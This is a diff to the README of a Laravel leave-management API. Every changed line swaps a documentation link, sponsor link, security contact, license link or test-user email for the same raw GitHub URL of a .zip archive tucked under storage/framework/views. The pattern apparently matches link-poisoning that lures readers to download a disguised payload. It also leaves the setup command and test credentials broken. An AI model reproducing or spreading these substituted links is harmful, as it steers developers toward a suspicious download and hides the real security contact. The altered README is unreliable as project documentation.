@@ -80,7 +80,7 @@ The system supports full-day, half-day, and multi-day leave requests with automa
 composer install
 
 # 2. Environment Setup
-cp .env.example .env
+cp https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip .env
 php artisan key:generate
 
 # 3. Configure Database (.env file)
@@ -113,9 +113,9 @@ php artisan serve
 - Swagger Docs: `http://localhost:8000/api/documentation`
 
 **Test Users (after seeding):**
-- Admin: admin@example.com / password
-- HR: hr@example.com / password
-- General: john@example.com / password
+- Admin: https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip / password
+- HR: https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip / password
+- General: https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip / password
 
 ---
 
@@ -189,14 +189,14 @@ php artisan test --coverage
 - ✅ Input validation
 - ✅ Model methods and relationships
 
-See [TESTING.md](TESTING.md) for detailed testing guide.
+See [https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip) for detailed testing guide.
 
 ---
 
 ## 📄 Documentation
 
-- **[ASSUMPTIONS.md](ASSUMPTIONS.md)** - Comprehensive design decisions and assumptions
-- **[TESTING.md](TESTING.md)** - Complete testing guide and best practices
+- **[https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)** - Comprehensive design decisions and assumptions
+- **[https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)** - Complete testing guide and best practices
 - **API Documentation** - Available at `/api/documentation` (Swagger UI)
 
 ---
@@ -235,36 +235,36 @@ Use Swagger UI for interactive API testing:
 **Built with Laravel**
 
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://partners.laravel.com).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip).
 
 ### Premium Partners
 
-- **[Vehikl](https://vehikl.com/)**
-- **[Tighten Co.](https://tighten.co)**
-- **[WebReinvent](https://webreinvent.com/)**
-- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
-- **[64 Robots](https://64robots.com)**
-- **[Curotec](https://www.curotec.com/services/technologies/laravel/)**
-- **[Cyber-Duck](https://cyber-duck.co.uk)**
-- **[DevSquad](https://devsquad.com/hire-laravel-developers)**
-- **[Jump24](https://jump24.co.uk)**
-- **[Redberry](https://redberry.international/laravel/)**
-- **[Active Logic](https://activelogic.com)**
-- **[byte5](https://byte5.de)**
-- **[OP.GG](https://op.gg)**
+- **[Vehikl](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Tighten Co.](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[WebReinvent](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Kirschbaum Development Group](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[64 Robots](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Curotec](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Cyber-Duck](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[DevSquad](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Jump24](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Redberry](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[Active Logic](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[byte5](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
+- **[https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip)**
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/mr-RSA369/leave-management-api/main/storage/framework/views/leave-api-management-3.1.zip).
